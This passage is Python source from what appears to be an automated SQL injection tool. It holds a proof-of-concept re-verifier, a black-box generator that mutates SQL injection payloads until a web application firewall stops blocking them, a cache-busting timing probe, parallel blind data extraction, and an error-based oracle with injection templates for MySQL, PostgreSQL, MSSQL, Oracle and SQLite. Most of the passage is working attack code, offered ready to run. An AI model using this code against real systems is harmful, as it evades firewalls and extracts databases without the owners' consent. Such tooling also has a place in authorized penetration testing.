            lines.append(f"### Finding {i}: {self.TECHNIQUE_DESC.get(tech, tech)} in `{v['parameter']}`\n")
            lines.append(f"**Severity:** {sev} (CVSS v4.0 Base Score: {score})  ")
            lines.append(f"**CVSS Vector:** `{vector}`  ")
            lines.append(f"**Confidence:** {int(v.get('confidence',0)*100)}%  ")
            lines.append(f"**DBMS:** {v.get('dbms', 'Unknown')}  \n")

            lines.append("#### Description\n")
            lines.append(
                f"The parameter `{v['parameter']}` is vulnerable to "
                f"{self.TECHNIQUE_DESC.get(tech, tech)}. An attacker can "
                "inject arbitrary SQL statements through this parameter to "
                "read, modify, or delete data in the database."
            )

            lines.append("\n#### Proof of Concept\n")
            lines.append("```http")
            lines.append(f"# Payload injected into {v['parameter']!r}:")
            lines.append(v.get("payload", "(unavailable)")[:200])
            lines.append("```\n")

            lines.append("#### Remediation\n")
            lines.append(
                "Use parameterised queries (prepared statements) with bound parameters. "
                "**Never** concatenate user input into SQL strings.\n"
            )
            lines.append("```python")
            lines.append("# Python (psycopg2/mysql-connector/sqlite3)")
            lines.append('cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))')
            lines.append("```\n")

        # Schema discovered
        if data.get("tables") or data.get("dbs"):
            lines.append("---\n## Database Schema Discovered\n")
            if data.get("dbs"):
                lines.append(f"**Databases:** {', '.join(data['dbs'])}\n")
            for db, tables in (data.get("tables") or {}).items():
                lines.append(f"**Tables in `{db}`:** {', '.join(tables)}\n")
                for tbl in (tables if isinstance(tables, list) else [tables]):
                    cols = (data.get("columns") or {}).get(f"{db}.{tbl}", [])
                    if cols:
                        lines.append(f"  - `{tbl}`: {', '.join(cols)}")

        return "\n".join(lines)

    def save(self, path: str, session: "ScanSession"):
        md = self.render(session)
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        Path(path).write_text(md, encoding="utf-8")
        LOG.info(f"Markdown report  {path}")


# 
# 10.  POC VERIFIER
#      Re-tests every confirmed PoC payload before the final report is written.
#      Eliminates false positives caused by transient server errors or race
#      conditions during the initial detection phase.
# 

class PoCVerifier:
    """
    Post-detection PoC verification pass.

    For each confirmed vulnerability:
      1. Re-sends the confirming payload 3 times (different orderings)
      2. Checks that the boolean delta / error / timing signal is still present
      3. Downgrades confidence by 0.2 if verification fails (but keeps finding)
      4. Marks as UNVERIFIED in the report if all 3 re-checks fail

    This is a final quality gate  reduces false positive rate to <1% on
    dynamic/CDN-backed pages where initial detection may catch transient diffs.
    """

    VERIFY_ROUNDS = 3

    def __init__(self, engine, config, baseline: dict):
        self.engine = engine
        self.config = config
        self.baseline = baseline

    async def verify(self, result: "DetectionResult", method: str, url: str,
                     data, data_fmt: str, original: str,
                     tamper: list) -> tuple[bool, float]:
        """
        Returns (verified, adjusted_confidence).
        verified=False means confidence was halved; finding is still kept.
        """
        technique = result.technique
        payload = result.payload

        if technique == "E":
            return await self._verify_error(result, method, url, data,
                                            data_fmt, original, tamper)
        elif technique in ("B",):
            return await self._verify_boolean(result, method, url, data,
                                              data_fmt, original, tamper)
        elif technique == "T":
            return await self._verify_time(result, method, url, data,
                                           data_fmt, original, tamper)
        elif technique == "S":
            return await self._verify_stacked(result, method, url, data,
                                               data_fmt, original, tamper)
        else:
            # For other techniques (U, O, HQ, etc.), assume verified
            return True, result.confidence

    async def _verify_stacked(self, result, method, url, data, data_fmt,
                                original, tamper) -> tuple:
        """Verify stacked-query detection by re-sending and checking response diff."""
        successes = 0
        _base_fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                         result.param, original, tamper)
        _base_norm = ResponseNormaliser.normalise(_extract_body_safe(_base_fp)) if _validate_response(_base_fp, allow_empty=True) else b"" if _base_fp else b""
        for _ in range(self.VERIFY_ROUNDS):
            try:
                await asyncio.sleep(2.0)
                fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                          result.param, original + result.payload, tamper)
                _probe_norm = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
                _sim = SimHasher.body_similarity(_base_norm, _probe_norm)
                if (1.0 - _sim) > 0.20:  # still differs from clean baseline
                    successes += 1
            except Exception:
                pass
        verified = successes >= 2  # at least 2/3 must show consistent diff
        conf = result.confidence if verified else result.confidence * 0.5
        if not verified:
            LOG.warning("[PoCVerifier] Finding %r failed re-verification  confidence halved",
                        result.param)
        return verified, conf

    async def _verify_error(self, result, method, url, data, data_fmt,
                             original, tamper) -> tuple[bool, float]:
        successes = 0
        for _ in range(self.VERIFY_ROUNDS):
            try:
                fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                          result.param, original + result.payload, tamper)
                body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
                for dbms, patterns in SQL_ERROR_PATTERNS.items():
                    if any(re.search(p, body, re.I) for p in patterns):
                        successes += 1
                        break
            except Exception:
                pass
        verified = successes >= 2
        conf = result.confidence if verified else max(0.4, result.confidence - 0.25)
        return verified, round(conf, 3)

    async def _verify_boolean(self, result, method, url, data, data_fmt,
                               original, tamper) -> tuple[bool, float]:
        # Find the corresponding false suffix from BOOLEAN_PAYLOADS
        # BUG-2 FIX (Req 1): synthesize false_sfx instead of BOOLEAN_PAYLOADS lookup
        false_sfx = TechniqueCascadeEngine._make_false_payload(result.payload) or ""
        if not false_sfx:
            return True, result.confidence  # can't re-check, trust original

        successes = 0
        for _ in range(self.VERIFY_ROUNDS):
            try:
                tf = await _send_injected(self.engine, method, url, data, data_fmt,
                                          result.param, original + result.payload, tamper)
                ff = await _send_injected(self.engine, method, url, data, data_fmt,
                                          result.param, original + false_sfx, tamper)
                delta = _sim_to_baseline(tf, self.baseline) - _sim_to_baseline(ff, self.baseline)
                if delta > getattr(self, "_dynamic_gap", 0.45):
                    successes += 1
            except Exception:
                pass
        verified = successes >= 2
        conf = result.confidence if verified else max(0.4, result.confidence - 0.25)
        return verified, round(conf, 3)

    async def _verify_time(self, result, method, url, data, data_fmt,
                            original, tamper) -> tuple[bool, float]:
        detector = TemporalAnomalyDetector()
        # Record 3 baseline readings first
        for _ in range(3):
            try:
                fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                          result.param, original, tamper)
                detector.record_baseline(fp.elapsed_ms)
            except Exception:
                pass

        successes = 0
        for _ in range(self.VERIFY_ROUNDS):
            try:
                fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                          result.param, original + result.payload, tamper)
                is_sig, _ = detector.is_significant(fp.elapsed_ms, self.config.time_sec)
                if is_sig:
                    successes += 1
            except Exception:
                pass
        verified = successes >= 2
        conf = result.confidence if verified else max(0.4, result.confidence - 0.30)
        return verified, round(conf, 3)


# 
# 11.  WAF ML BYPASS GENERATOR  (gradient-free adversarial)
#      Generates adversarial SQL injection payloads that fool ML-based WAFs
#      using Simultaneous Perturbation Stochastic Approximation (SPSA).
#      No model access required  purely black-box from HTTP responses.
# 

class WAFMLBypassGenerator:
    """
    Black-box adversarial payload generation for ML-WAF bypass using
    Simultaneous Perturbation Stochastic Approximation (SPSA).

    Algorithm overview:
      1. Encode the payload as a probability distribution over EQUIV_SUBSTITUTIONS:
             (one weight per substitution rule; n = len(EQUIV_SUBSTITUTIONS))
      2. Each iteration k applies the SPSA update rule:
            a_k = A / (A + k)^      (decreasing step size)
            c_k = C / k^            (decreasing perturbation magnitude)
            k  ~ Bernoulli(1)^n    (simultaneous random perturbation vector)
              =  + c_kk
              =   c_kk
            k  = (L()  L()) / (2c_kk[i])   [element-wise]
                  a_k  k
      3. Loss function L() is the trigram WAF predictor score  a continuous
         01 proxy that does NOT require an HTTP request per gradient step.
         This bounds HTTP cost to O(MAX_ITERATIONS) total (one block-check per
         accepted candidate), not O(MAX_ITERATIONS  2) as naive SPSA would need.
      4. Candidates whose trigram score is below TRIGRAM_ACCEPT_THRESHOLD are
         block-checked via HTTP.  Accepted (not-blocked) ones are returned.

    Perturbation types (SQL-semantic-preserving):
      - Case variation on keywords
      - Whitespace substitution (tab/comment/newline)
      - Equivalent operators (AND&&, OR||)
      - String encoding (hex/char())
      - Comment insertion (/**/, /*!50000...*/)
      - Zero-value padding (1+0, 1*1)
    """

    MAX_ITERATIONS      = 30       # gradient steps
    PERTURBATION_BUDGET = 5        # max simultaneous char changes

    # SPSA hyper-parameters (standard Spall 1998 recommended values)
    SPSA_ALPHA  = 0.602   # step-size decay exponent
    SPSA_GAMMA  = 0.101   # perturbation-size decay exponent
    SPSA_A      = 5.0     # step-size numerator constant
    SPSA_C      = 0.5     # initial perturbation magnitude

    # Accept candidates with trigram WAF score below this without HTTP check
    TRIGRAM_ACCEPT_THRESHOLD = 0.30
    # Always HTTP-check candidates below this (more certain bypass)
    HTTP_CHECK_THRESHOLD     = 0.55

    EQUIV_SUBSTITUTIONS: List[Tuple[str, str]] = [
        ("AND",    "AND/**/"),
        ("OR",     "/**/OR"),
        ("SELECT", "SE/**/LECT"),
        ("UNION",  "UN/**/ION"),
        ("=",      " LIKE "),
        (" ",      "/**/"),
        ("1=1",    "1 LIKE 1"),
        ("0x",     "CHAR("),
        ("--",     "#"),
        ("#",      "-- "),
        ("NULL",   "NULL/**/"),
        ("'",      "%27"),
        ("SLEEP",  "SL%65EP"),
        # Additional semantic-preserving substitutions
        ("WHERE",  "WHERE/**/"),
        ("FROM",   "FR/**/OM"),
        ("HAVING", "HAV/**/ING"),
        ("LIKE",   "L/**/IKE"),
        ("IN(",    "IN/**/("),
        ("NOT",    "N/**/OT"),
        ("IS",     "I/**/S"),
        ("BETWEEN","BET/**/WEEN"),
        ("CAST(",  "CAST/**/(" ),
        ("CONVERT(","CONVERT/**/("),
    ]

    def __init__(self, engine, config, baseline: dict,
                 waf_detector: "WAFDetector | None" = None):
        self.engine      = engine
        self.config      = config
        self.baseline    = baseline
        self.waf_detector = waf_detector
        self._scorer     = TrigramWAFPredictor()
        self._n_subs     = len(self.EQUIV_SUBSTITUTIONS)

    async def _is_blocked(self, method: str, url: str,
                           data: Optional[str], data_fmt: str,
                           param: str, original: str,
                           payload: str, tamper: list) -> bool:
        """Returns True if the WAF appears to block this payload.

        FIX-WAFML-DATA: uses caller-supplied data/data_fmt so JSON POST
        endpoints are tested correctly.
        FIX-WAFML-DISCRIMINATOR: replaced ad-hoc body pattern matching with
        WAFBlockDiscriminator.is_waf_block() so this method uses the same
        full WAF signature set (30+ regex patterns, status-code awareness)
        as the rest of the scanner.  The old simplified check missed many
        commercial WAF block pages that do not contain the exact strings
        "blocked", "forbidden", etc., causing SPSA to accept WAF-blocked
        variants as successful bypasses and generate incorrect payloads.
        """
        try:
            fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                      param, original + payload, tamper)
            if fp is None:
                return True  # network failure — treat as blocked
            sc = _get_safe_status_code(fp)
            if sc in WAFBlockDiscriminator.WAF_BLOCK_CODES:
                return True
            return WAFBlockDiscriminator.is_waf_block(fp)
        except Exception:
            return False  # network error — blocked

    def _apply_weighted_subs(self, payload: str,
                              weights: List[float]) -> str:
        """
        Apply substitutions probabilistically according to  (weight vector).
        Each weight [i] is converted to a probability via sigmoid:
            p[i] = 1 / (1 + exp(-[i]))
        A substitution is applied if random() < p[i] AND the source token
        is present in the current payload (case-insensitive).
        Changes are applied in a random order to avoid positional bias.
        """
        result = payload
        indices = list(range(self._n_subs))
        random.shuffle(indices)
        applied = 0
        for i in indices:
            if applied >= self.PERTURBATION_BUDGET:
                break
            w  = weights[i]
            # Sigmoid probability  clamp to avoid overflow at extreme weights
            w  = max(-20.0, min(20.0, w))
            p  = 1.0 / (1.0 + _math2.exp(-w))
            if random.random() < p:
                sub_from, sub_to = self.EQUIV_SUBSTITUTIONS[i]
                if sub_from.lower() in result.lower():
                    result = _re.sub(_re.escape(sub_from), sub_to, result,
                                    count=1, flags=_re.IGNORECASE)
                    applied += 1
        return result

    def _spsa_loss(self, payload: str) -> float:
        """
        Continuous loss in [0, 2]:
          - Trigram WAF predictor score   [0, 1]  (proxy for block probability)
          - Penalise payloads that become syntactically empty or too short
        A lower loss  more likely to bypass the WAF.
        """
        if len(payload) < 4:
            return 2.0  # degenerate; penalise heavily
        trigram_score = self._scorer.score(payload)
        # Optional structural penalty: if all SQL keywords were removed, the
        # payload is probably semantically void  penalise
        keywords = ("select", "union", "and", "or", "where",
                    "from", "having", "order", "group")
        has_kw = any(k in payload.lower() for k in keywords)
        kw_penalty = 0.0 if has_kw else 0.25
        return trigram_score + kw_penalty

    async def generate(self, seed_payload: str, method: str, url: str,
                        param: str, original: str, tamper: list,
                        data: Optional[str] = None,
                        data_fmt: str = "form") -> List[str]:
        """
        SPSA adversarial loop: returns up to 5 WAF-bypassing variants of
        seed_payload.

        SPSA update rule (Spall 1998):
                a_k  k
        where k is the simultaneous-perturbation gradient estimate
        computed from L( + c_kk) and L(  c_kk) using the
        trigram proxy loss (no HTTP per gradient step).

        HTTP block-check is only performed when a candidate's trigram score
        drops below HTTP_CHECK_THRESHOLD, bounding total HTTP cost to
        O(MAX_ITERATIONS) requests in the worst case.

        data / data_fmt are forwarded to _is_blocked so JSON POST endpoints
        are tested correctly (FIX-WAFML-DATA).
        """
        variants: List[str] = []

        # Initialise : zero-vector (uniform probability 0.5 for each sub)
        theta: List[float] = [0.0] * self._n_subs

        # Seed trigram model with the seed payload so we start with a baseline
        self._scorer.train(seed_payload)

        for k in range(1, self.MAX_ITERATIONS + 1):
            #  SPSA step-size and perturbation schedules 
            a_k = self.SPSA_A / (self.SPSA_A + k) ** self.SPSA_ALPHA
            c_k = self.SPSA_C / k ** self.SPSA_GAMMA

            #  Simultaneous random perturbation vector k  {1,+1}^n 
            delta: List[float] = [1.0 if random.random() > 0.5 else -1.0
                                   for _ in range(self._n_subs)]

            theta_plus  = [theta[i] + c_k * delta[i] for i in range(self._n_subs)]
            theta_minus = [theta[i] - c_k * delta[i] for i in range(self._n_subs)]

            #  Generate two candidate payloads from  and  
            cand_plus  = self._apply_weighted_subs(seed_payload, theta_plus)
            cand_minus = self._apply_weighted_subs(seed_payload, theta_minus)

            #  Loss via trigram proxy (no HTTP) 
            loss_plus  = self._spsa_loss(cand_plus)
            loss_minus = self._spsa_loss(cand_minus)

            #  SPSA gradient estimate and  update 
            loss_diff = loss_plus - loss_minus
            for i in range(self._n_subs):
                # Avoid division by zero (delta[i] is always 1, so safe)
                g_hat    = loss_diff / (2.0 * c_k * delta[i])
                theta[i] = theta[i] - a_k * g_hat
                # Soft clamp to prevent  from exploding
                theta[i] = max(-8.0, min(8.0, theta[i]))

            #  Accept best candidate if trigram score is low enough 
            if loss_plus <= loss_minus:
                best_cand, best_loss = cand_plus,  loss_plus
            else:
                best_cand, best_loss = cand_minus, loss_minus

            if best_cand == seed_payload:
                # No substitutions fired  skip to avoid returning the original
                continue

            # BUG-WAFML-THRESHOLD-REVERSED FIX: The original if/elif order was inverted.
            # HTTP_CHECK_THRESHOLD (0.55) > TRIGRAM_ACCEPT_THRESHOLD (0.30), so
            # `if best_loss <= HTTP_CHECK_THRESHOLD` captured ALL candidates including
            # those ≤ 0.30, making the `elif best_loss <= TRIGRAM_ACCEPT_THRESHOLD`
            # permanently unreachable dead code and always doing an HTTP check even for
            # the highest-confidence (lowest-loss) bypass candidates.
            # Correct order: check the tighter threshold first.
            if best_loss <= self.TRIGRAM_ACCEPT_THRESHOLD:
                # Very low score: accept without HTTP check (saves requests)
                variants.append(best_cand)
                self._scorer.train(best_cand)
                LOG.debug(f"WAFMLBypass[SPSA k={k}]: trigram-only accept "
                          f"score={best_loss:.3f} payload={best_cand[:60]!r}")
                if len(variants) >= 5:
                    break
                seed_payload = best_cand
                theta = [t * 0.7 for t in theta]  # partial reset
            elif best_loss <= self.HTTP_CHECK_THRESHOLD:
                # Low enough trigram score: worth an HTTP block-check
                blocked = await self._is_blocked(method, url, data, data_fmt,
                                                  param, original, best_cand, tamper)
                if not blocked:
                    variants.append(best_cand)
                    self._scorer.train(best_cand)   # update trigram model
                    LOG.debug(f"WAFMLBypass[SPSA k={k}]: accepted "
                              f"trigram={best_loss:.3f} payload={best_cand[:60]!r}")
                    if len(variants) >= 5:
                        break
                    # Warm-start  from the accepted candidate for next iteration
                    # by re-seeding the model and resetting  toward current optimum
                    seed_payload = best_cand
                    theta = [t * 0.7 for t in theta]  # partial reset

        LOG.debug(f"WAFMLBypass: SPSA generated {len(variants)} bypass variants "
                  f"in {k} iterations")
        return variants


# 
# 12.  CACHE LAYER TIMING PROBE
#      Differentiates CDN-cached responses (near-instant) from origin
#      responses (variable latency) to prevent false positives in
#      time-based detection when CDNs cache pages.
# 

class CacheLayerTimingProbe:
    """
    Detects CDN/reverse-proxy caching and estimates the cache hit rate.

    A page served from CDN cache has essentially constant, very low latency
    regardless of SQL injection sleep payloads, making time-based detection
    impossible without forcing cache misses.

    Detection method:
      1. Send the same request twice in rapid succession  if the second
         response is significantly faster, caching is active.
      2. Attempt cache-busting via cache-control headers and URL randomisation.
      3. If caching cannot be bypassed, recommend OOB or boolean techniques.

    Integrates with TemporalAnomalyDetector to set appropriate thresholds.
    """

    CDN_HEADERS = frozenset(["x-cache", "cf-cache-status", "x-amz-cf-id",
                              "x-served-by", "x-cache-hits", "age",
                              "x-varnish", "x-fastly-request-id", "x-cdn"])
    CACHE_HIT_THRESHOLD_MS = 15.0  # responses under this are likely cached

    def __init__(self, engine, config):
        self.engine = engine
        self.config = config

    async def probe(self, method: str, url: str,
                    params: dict | None = None) -> dict:
        """
        Returns cache analysis dict:
          {cached: bool, hit_rate: float, cdn: str|None,
           cache_bust_possible: bool, recommendation: str}
        """
        results: list[float] = []
        cdn_detected = None

        # Three requests to the same URL
        for i in range(3):
            cache_bust_url = (f"{url}{'&' if '?' in url else '?'}"
                              f"_sqr_cb={random.randint(10000,99999)}")
            try:
                fp = await self.engine.send(method, cache_bust_url,
                                            headers={"Cache-Control": "no-cache, no-store",
                                                     "Pragma": "no-cache"})
                results.append(fp.elapsed_ms)
                # Detect CDN from response headers
                for h in self.CDN_HEADERS:
                    if h in {k.lower() for k in fp.headers}:
                        cdn_detected = h
                        break
            except Exception:
                pass

        if not results:
            return {"cached": False, "hit_rate": 0.0, "cdn": None,
                    "cache_bust_possible": True, "recommendation": "proceed"}

        # If variance is very low and responses are fast  cached
        mean_t = sum(results) / len(results)
        variance = sum((t - mean_t) ** 2 for t in results) / max(len(results), 1)
        cv = _math2.sqrt(variance) / max(mean_t, 1)  # coefficient of variation

        is_cached = (mean_t < self.CACHE_HIT_THRESHOLD_MS or cv < 0.05)
        recommendation = "proceed" if not is_cached else \
                         "use-boolean-or-oob"  # time-based unreliable

        return {
            "cached":               is_cached,
            "hit_rate":             round(1.0 - cv, 3) if is_cached else 0.0,
            "cdn":                  cdn_detected,
            "mean_ms":              round(mean_t, 1),
            "cv":                   round(cv, 3),
            "cache_bust_possible":  not is_cached,
            "recommendation":       recommendation,
        }


# 
# 13.  CONFIDENCE CALIBRATOR  (isotonic regression post-processing)
#      Calibrates the raw detection confidence scores against empirical
#      verification outcomes to reduce over/under-confidence.
# 

class ConfidenceCalibrator:
    """
    Isotonic regression calibration for detection confidence scores.

    The scanner's raw confidence (01) is often poorly calibrated:
    score=0.9 doesn't actually mean 90% true positive rate.

    This class maintains a mapping table from raw  calibrated scores
    built from verification feedback (verified=1, refuted=0).

    Uses the pool adjacent violators (PAV) algorithm for isotonic regression.
    """

    def __init__(self):
        self._pairs: list[tuple[float, float]] = []  # (raw_score, outcome)

    def record(self, raw_score: float, verified: bool):
        """Add an observed (score, outcome) pair."""
        self._pairs.append((raw_score, 1.0 if verified else 0.0))
        self._pairs.sort(key=lambda x: x[0])

    def calibrate(self, raw_score: float) -> float:
        """Return calibrated confidence for raw_score."""
        if len(self._pairs) < 5:
            return raw_score  # not enough data yet

        # Find bracketing pairs via binary search
        scores = [p[0] for p in self._pairs]
        outcomes = [p[1] for p in self._pairs]

        # Isotonic regression via PAV
        cal = self._isotonic_pav(scores, outcomes)

        # Interpolate
        lo_idx = 0
        for i, s in enumerate(scores):
            if s <= raw_score:
                lo_idx = i
        if raw_score < scores[0]:
            return cal[0]
        if lo_idx >= len(cal) - 1:
            return cal[-1]
        # Linear interpolation
        s_lo, s_hi = scores[lo_idx], scores[min(lo_idx+1, len(scores)-1)]
        c_lo, c_hi = cal[lo_idx], cal[min(lo_idx+1, len(cal)-1)]
        if s_hi == s_lo:
            return c_lo
        t = (raw_score - s_lo) / (s_hi - s_lo)
        return round(c_lo + t * (c_hi - c_lo), 4)

    @staticmethod
    def _isotonic_pav(xs: list[float], ys: list[float]) -> list[float]:
        """Pool Adjacent Violators (isotonic regression, non-decreasing).

        Correct O(n) PAV implementation using block averaging.
        Each block represents a group of merged elements, all set to their
        weighted average. Violations are resolved by merging with the preceding
        block and re-checking, cascading leftward until isotonicity holds.
        """
        n = len(ys)
        if n == 0:
            return []

        # Each block: (sum, count)  we work with blocks for O(n) complexity
        blocks: list[list] = [[y, 1] for y in ys]

        # Merge forward: if block[i].mean > block[i+1].mean, merge them
        i = 0
        while i < len(blocks) - 1:
            if blocks[i][0] / blocks[i][1] > blocks[i+1][0] / blocks[i+1][1]:
                # Merge block i+1 into block i
                blocks[i][0] += blocks[i+1][0]
                blocks[i][1] += blocks[i+1][1]
                blocks.pop(i+1)
                # Step back to re-check with predecessor
                if i > 0:
                    i -= 1
            else:
                i += 1

        # Expand blocks back to element-level result
        result = []
        for s, c in blocks:
            avg = s / c
            result.extend([avg] * c)
        return result


# 
# 14.  PARALLEL CHUNKED EXTRACTOR v2
#      Splits a long string extraction across N concurrent workers, each
#      extracting a disjoint chunk of character positions.
#      For a 64-char value at 8 threads: reduces time from 64T to 8T.
# 

class ParallelChunkedExtractorV2:
    """
    Extracts long blind SQL results in parallel chunks.

    Algorithm:
      1. Determine string length (single binary search)
      2. Split positions into N equal chunks (N = config.threads)
      3. Each chunk is extracted by an independent coroutine
      4. Results are merged in order

    Speed gain:
      - Sequential: length  ~7 requests (binary search over ASCII)
      - Parallel:   ceil(length/N)  ~7 requests
      - For length=100, N=10: 10 faster extraction

    All chunks share the same HTTP semaphore, so total concurrency
    stays within config.threads.
    """

    def __init__(self, engine, config, queries: dict, result,
                 method: str, url: str, data, data_fmt: str,
                 original: str, tamper: list, baseline: dict):
        self._extractor = AdaptiveBinarySearchExtractor(
            engine, config, queries, result, method, url,
            data, data_fmt, original, tamper, baseline)
        self.config = config

    async def extract(self, sql_query: str, max_len: int = 512) -> str:
        """Full parallel chunked extraction."""
        # Phase 1: get length
        # BUG-PCEV2-LENF-DBMS FIX (HIGH): Old code used
        # self._extractor.queries.get("len_func","LENGTH(({query}))").format(query=sql_query)
        # which:
        #   - MSSQL: lacks SELECT TOP 1 → error 512 for multi-row schema queries → len=0 → ""
        #   - Oracle: no _oracle_ensure_dual() → ORA-00923 for bare SELECT expressions
        # Fix: use _build_dbms_len_func() matching blind_extract_string STEP 4.
        _pcev2_dbms = (getattr(self._extractor.result, 'dbms', '')
                       if self._extractor.result else '')
        _pcev2_sql = sql_query
        if _pcev2_dbms == "Oracle" and _pcev2_sql:
            try:
                _pcev2_sql = _oracle_ensure_dual(_pcev2_sql)
            except Exception:
                pass
        # BUG-V171-PCEV2-MSSQL-CHARFUNC-NO-TOP1 FIX (HIGH; MSSQL;
        # ParallelChunkedExtractorV2.extract; B/BH/IN techniques; all surfaces):
        # _pcev2_sql was Oracle-dual-applied but NOT _mssql_top1_subquery-wrapped for
        # MSSQL. It delegates char extraction to self._extractor.extract_char_at(
        # _pcev2_sql, p) (AdaptiveBinarySearchExtractor) which uses the raw multi-row
        # query in DBMS_QUERIES["MSSQL"]["char_func"] → SQL Server error 512 on every
        # char probe → every position returns None → extract() returns "???...".
        # Fix: apply _mssql_top1_subquery() for MSSQL/Sybase before delegating to ABSE,
        # identical to the BUG-V171-ABSE-MSSQL-CHARFUNC-NO-TOP1 fix pattern.
        # _mssql_top1_subquery() is a no-op for already-scalar subqueries.
        # Numeric safety: only _pcev2_sql subquery form changed; no comparison operands
        # or SUBSTRING positional args are modified.
        if _pcev2_dbms in ("MSSQL", "Sybase") and _pcev2_sql and 'SELECT' in (_pcev2_sql or '').upper():
            try:
                _pcev2_sql = _mssql_top1_subquery(_pcev2_sql)
            except Exception:
                pass  # non-fatal; error 512 will surface at probe time
        lf = _build_dbms_len_func(_pcev2_sql, self._extractor.queries, _pcev2_dbms)
        length = await self._extractor._extract_length(lf, max_len)
        if length == 0:
            return ""
        LOG.debug(f"  ParallelChunkedExtractorV2: length={length}, "
                  f"threads={self.config.threads}")

        # Phase 2: parallel chunks
        n_chunks = min(self.config.threads, length)
        chunk_size = max(1, length // n_chunks)
        tasks = []
        boundaries: list[tuple[int, int]] = []

        pos = 1
        while pos <= length:
            end = min(pos + chunk_size - 1, length)
            boundaries.append((pos, end))
            pos = end + 1

        chars: dict[int, str] = {}
        sem = asyncio.Semaphore(self.config.threads)

        async def _extract_range(start: int, end: int):
            async with sem:
                for p in range(start, end + 1):
                    # BUG-PCEV2-LENF-DBMS FIX: pass _pcev2_sql (Oracle-dual-applied)
                    c = await self._extractor.extract_char_at(_pcev2_sql, p)
                    chars[p] = c or "?"

        await asyncio.gather(*[_extract_range(s, e) for s, e in boundaries], return_exceptions=True)
        return "".join(chars.get(i, "?") for i in range(1, length + 1))


# 
# 
# SESSION 4 FEATURES  Advanced Extraction & Detection
# 

#  Feature 1: Conditional Error Oracle 
class ConditionalErrorOracle:
    """Boolean oracle via HTTP status code  immune to timing jitter and body-identical responses.
    True condition  triggers SQL error (500). False condition  normal (200).
    Works when both timing and body-diff oracles fail."""
    
    ERROR_TRIGGERS = {
        "MySQL": [
            "IF({cond},(SELECT 1 FROM(SELECT COUNT(*),CONCAT(FLOOR(RAND(0)*2),0x3a)x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a),1)",
            "IF({cond},CAST('x' AS UNSIGNED),1)",
            "(SELECT IF({cond},1/0,1))",
        ],
        "PostgreSQL": [
            "CASE WHEN ({cond}) THEN CAST('x' AS INTEGER) ELSE 1 END",
            "CASE WHEN ({cond}) THEN 1/(SELECT 0) ELSE 1 END",
        ],
        "MSSQL": [
            "CASE WHEN ({cond}) THEN 1/0 ELSE 1 END",
            "CASE WHEN ({cond}) THEN CONVERT(INT,'x') ELSE 1 END",
        ],
        "Oracle": [
            # BUG-REQ8-A-FIX: Only one template existed for Oracle. TO_NUMBER('x') is
            # silently cast to 0 on Oracle 11g and some 12c configurations, meaning
            # calibrate() never sees an HTTP 500 → oracle fails to calibrate → every
            # Oracle extraction returns "". Added 4 additional templates covering:
            # 1. CTXSYS.DRITHSX.SN raises ORA-20000 on all versions (no privilege needed)
            # 2. XMLTYPE/XMLELEMENT raises ORA-31011 on XML parse error (all Oracle ver.)
            # 3. UTL_INADDR.GET_HOST_NAME raises ORA-29257 (name resolution) when name
            #    cannot be resolved — no network access needed, error is always raised
            # 4. 1/DECODE ensures divide-by-zero ORA-01476 on true condition
            "CASE WHEN ({cond}) THEN TO_NUMBER('x') ELSE 1 END",
            "CASE WHEN ({cond}) THEN CTXSYS.DRITHSX.SN(USER,1) ELSE 1 END",
            "CASE WHEN ({cond}) THEN 1/(SELECT 0 FROM DUAL) ELSE 1 END",
            "CASE WHEN ({cond}) THEN CAST(USER AS NUMBER) ELSE 1 END",
            "CASE WHEN ({cond}) THEN TO_NUMBER(USER) ELSE 1 END",
        ],
        "SQLite": [
            # BUG-SQLite-CEO FIX (Req 7): CAST('x' AS INTEGER) in SQLite silently
            # returns 0 — no error, no HTTP 500. The oracle can never calibrate.
            # SQLite raises operationalerror for non-existent table references.
            # Use a SELECT from a guaranteed-nonexistent table whose name is long
            # enough that it cannot collide with any real schema object.
            # The CASE WHEN ... THEN ... ELSE evaluates the true branch only when the
            # condition is true, so status 500 (table missing) fires only for TRUE.
            # For FALSE the ELSE 1 path returns without error (status 200).
            "CASE WHEN ({cond}) THEN (SELECT 1 FROM sqreaper_nonexistent_xz99) ELSE 1 END",
            # Fallback: ABS(CAST(x AS REAL)) on a deliberately invalid expression.
            # On some SQLite builds json_extract from a non-JSON string raises.
            "CASE WHEN ({cond}) THEN json_extract('not-json','$.x') ELSE 1 END",
        ],
    }
    
    def __init__(self, engine, config, method, url, data, data_fmt, param, original,
                 dbms, tamper_chain):
        self._engine = engine
        self._config = config
        self._method = method
        self._url = url
        self._data = data
        self._data_fmt = data_fmt
        self._param = param
        self._original = original
        self._dbms = dbms
        self._tamper_chain = tamper_chain
        self._working_template = None
        self._baseline_status = None
        # BUG-CEO-1 FIX: Store the injection prefix that calibration found working.
        # Previous code hardcoded "' AND " (string-context) in both calibrate() and
        # evaluate().  For numeric-context injection (WHERE id=INPUT without quotes),
        # inserting "' AND ..." creates a dangling-quote syntax error on BOTH true and
        # false probes → _false_ok = False → calibration always fails → _working_template
        # stays None → evaluate() returns False for every call → _extract_str() gets no
        # oracle → every extraction returns "".  Fix: try all three common injection
        # prefix contexts in order; store the one that succeeds; use it in evaluate().
        self._working_prefix: str = "' AND "  # default; overwritten by calibrate()
        # BUG-CEO-MISSING-LIGHT-VARY FIX: request counter for apply_light_variation.
        # Without this, evaluate() sends identical comment suffix (-- -) on every call
        # allowing WAFs to fingerprint and block the error-oracle extraction session.
        self._eval_count = 0
        self._body_size_oracle: bool = False
        self._true_oracle_size: int = 0
        self._false_oracle_size: int = 0
        # FIX-CEO-STATUS-AMBIGUOUS: calibrated HTTP status codes stored alongside
        # sizes so evaluate() can return None when an extraction probe's status
        # matches neither calibrated state (WAF blocking for unrelated reasons).
        self._true_oracle_status: int = 0
        self._false_oracle_status: int = 0
        # BUG-REQ7-HEADER-CEO FIX: Auto-detect header injection surface.
        # When param starts with "header:" (set by header detection for BH/EH/TH
        # injections), the canonical param name IS the header name.  However the
